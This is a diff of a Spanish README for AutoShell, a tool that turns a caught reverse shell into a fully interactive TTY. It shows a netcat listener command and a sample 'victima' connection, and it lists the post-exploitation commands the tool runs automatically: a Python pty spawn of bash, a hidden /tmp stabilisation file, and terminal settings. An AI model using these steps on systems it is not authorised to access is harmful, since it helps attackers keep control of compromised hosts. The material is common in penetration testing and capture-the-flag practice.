@@ -7,42 +7,30 @@ Herramienta para automatizar la mejora de shells inversas a TTY completamente in
 ```bash
 git clone https://github.com//Mayky23/AutoShell.git
 cd AutoShell
-chmod +x AutoShell.sh
+chmod +x AutoShell.py
 ```
 
 ## 🛠 Uso básico
 
 ```bash
-# Modo básico
-./AutoShell.sh <puerto>
-
-# Especificar IP y puerto
-./AutoShell.sh <ip> <puerto>
+./AutoShell.py <puerto>
 ```
 
 ## 🌟 Ejemplo de uso
 
 ```bash
-$ ./AutoShell.sh 4444
-[*] Iniciando listener en 0.0.0.0:4444
-[*] Comando: nc -lvnp 4444
-[*] Esperando conexión...
-connect to [192.168.1.10] from (UNKNOWN) [192.168.1.20] 55892
-[+] Conexión establecida
-[*] Estabilizando shell...
-[+] Shell lista! Tomando control...
+$ ./AutoShell.py 4444
+[*] Escuchando en 0.0.0.0:4444...
+[+] Conexión de 10.0.2.15:44866
+[*] Shell activa
 
-user@victima:/home$  # Shell completamente interactiva
+# COMANDOS EJECUTADOS AUTOMATICAMANTE 
+usuario@debian:~$ python -c "import pty; pty.spawn('/bin/bash')"
+usuario@debian:~$ python3 -c "import pty; pty.spawn('/bin/bash')"
+usuario@debian:~$ echo "stty raw -echo; fg" > /tmp/.stab && chmod +x /tmp/.stab
+usuario@debian:~$ export TERM=xterm-256color
+usuario@debian:~$ stty rows 40 columns 180
+
+# SHELL COMPLETAMENTE INTERACTIVA
+usuario@debian:~$ 
 ```
-
-## 🛡 Características clave
-
-✔️ Autodetección de Python/alternativas
-
-✔️ Soporte para IPv4/IPv6
-
-✔️ Validación de parámetros robusta
-
-✔️ Limpieza automática de recursos
-
-✔️ Configuración óptima de terminal
